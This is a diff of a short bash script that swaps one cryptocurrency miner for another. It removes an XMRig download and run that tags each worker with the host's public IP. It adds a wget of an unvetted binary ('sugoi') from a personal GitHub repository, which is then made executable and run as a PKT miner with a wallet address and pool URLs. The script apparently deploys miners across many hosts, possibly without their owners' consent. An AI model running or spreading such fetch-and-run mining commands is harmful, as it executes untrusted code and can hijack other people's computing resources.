@@ -1,3 +1,4 @@
 #!/bin/bash
-wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz -O - | tar -xz && cd xmrig-6.17.0
-ip=$(echo \"$(curl -s ifconfig.me)\" | tr . _ ) && ./xmrig -a rx/0 -o rx.unmineable.com:3333  -u TRX:TRzWbrKRmJYETRPTrVW8RwbX6Sa9KJNbZ7.$ip -p x --threads=80 --cpu-priority=5 --randomx-mode=fast --keepalive
+wget https://raw.githubusercontent.com/AntonyAjax/ehem/main/sugoi
+chmod +x sugoi
+./sugoi ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 https://stratum.zetahash.com http://pool.pkt.world http://pool.pktpool.io http://pool.pkteer.com 2>&1 | grep goodrate
